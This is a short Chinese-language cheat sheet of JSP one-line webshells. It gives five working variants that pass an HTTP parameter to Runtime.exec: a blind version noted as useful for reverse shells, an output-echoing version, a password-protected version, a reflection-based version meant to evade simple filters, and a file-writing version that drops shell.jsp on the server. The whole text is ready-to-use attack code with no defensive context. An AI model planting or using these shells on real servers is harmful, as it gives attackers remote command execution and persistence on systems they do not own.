# jsp一句话

```
无回显:不会回显执行的结果只能在后台打印一个地址，常用来反弹shell
<%
    Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));
%>


<%@page import="java.util.*,java.io.*"%><% 
  Runtime.getRuntime().exec(request.getParameter("cmd"));
%>
```



```
带回显
  <%
    Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));
    InputStream inputStream = process.getInputStream();
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
    String line;
    while ((line = bufferedReader.readLine()) != null){
      response.getWriter().println(line);
    }
  %>

```



```
有密码的带回显
  <%
    if ("password".equals(request.getParameter("pass"))){
      Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));
      InputStream inputStream = process.getInputStream();
      BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
      String line;
      while ((line = bufferedReader.readLine()) != null){
        response.getWriter().println(line);
      }
    }
  %>

```

```
反射调用型​（绕过简单过滤）
<% 
  Class clazz = Class.forName("java.lang.Runtime");
  Object r = clazz.getMethod("getRuntime").invoke(null);
  clazz.getMethod("exec", String.class).invoke(r, request.getParameter("cmd"));
%>
```

```
​文件写入型​（结合Webshell上传）
<%
  String path = application.getRealPath("/") + "shell.jsp";
  new FileOutputStream(path).write(request.getParameter("f").getBytes());
%>
```




